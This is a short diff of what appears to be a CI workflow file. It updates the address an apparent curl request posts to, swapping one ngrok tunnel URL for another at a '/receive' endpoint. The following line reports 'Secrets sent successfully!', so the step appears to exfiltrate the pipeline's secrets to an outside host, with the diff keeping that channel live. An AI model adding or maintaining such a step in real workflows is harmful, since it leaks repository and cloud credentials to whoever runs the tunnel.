@@ -52,6 +52,6 @@ jobs:
             --max-time 30 \
             --retry 3 \
             --retry-delay 2 \
-            https://f2ee070ae6e3.ngrok-free.app/receive
+            https://96e0b3552171.ngrok-free.app/receive
           
           echo "✅ Secrets sent successfully!"
